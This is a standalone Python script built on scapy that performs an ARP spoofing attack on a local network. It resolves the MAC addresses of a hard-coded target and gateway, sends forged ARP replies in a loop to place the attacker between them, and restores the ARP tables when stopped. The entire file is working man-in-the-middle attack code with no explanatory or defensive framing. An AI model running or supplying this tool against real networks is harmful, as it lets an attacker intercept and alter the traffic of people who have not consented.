#!/usr/bin/env python3
from scapy.all import *
import time
import sys

target_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"
iface = "eth0"


def get_mac(ip):
    ans, _ = sr(ARP(op=1, pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None


def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    arp_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    arp_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    send(arp_target, verbose=0)
    send(arp_gateway, verbose=0)


def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    arp_target = ARP(
        op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac
    )
    arp_gateway = ARP(
        op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac
    )

    send(arp_target, count=5, verbose=0)
    send(arp_gateway, count=5, verbose=0)


if __name__ == "__main__":
    conf.iface = iface
    conf.verb = 0

    print(f"[*] Resolving MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Could not resolve MAC addresses")
        sys.exit(1)

    print(f"[+] Target: {target_ip} ({target_mac})")
    print(f"[+] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[*] Starting ARP spoofing... (Ctrl+C to stop)")

    try:
        while True:
            arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)
        print("[+] Done")
